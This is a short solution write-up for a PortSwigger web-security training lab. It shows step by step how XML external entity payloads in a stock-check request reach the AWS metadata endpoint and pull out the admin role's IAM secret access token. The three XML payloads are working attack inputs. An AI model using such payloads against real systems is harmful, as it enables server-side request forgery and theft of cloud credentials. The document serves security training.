# Lab 02 — Exploiting XXE to perform SSRF attacks

> **Practitioner** · [Official lab](https://portswigger.net/web-security/xxe/exploiting-xxe-to-perform-ssrf)

**Entry point:** `POST /product/stock` XML · **Goal:** hit the AWS metadata
endpoint at `169.254.169.254` and steal IAM credentials.

## Solution

1. Inject an entity pointing at the metadata root:

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

The error/echo leaks the directory listing: `latest/meta-data/`.

2. Walk the path entity by entity:

```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
```
→ reveals `admin`.

3. Final step:

```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">
```

→ the response contains the admin IAM **secret access token** — submit it.

## Notes

Blind-walking internal APIs through entity errors/echoes is the generic XXE
SSRF workflow.
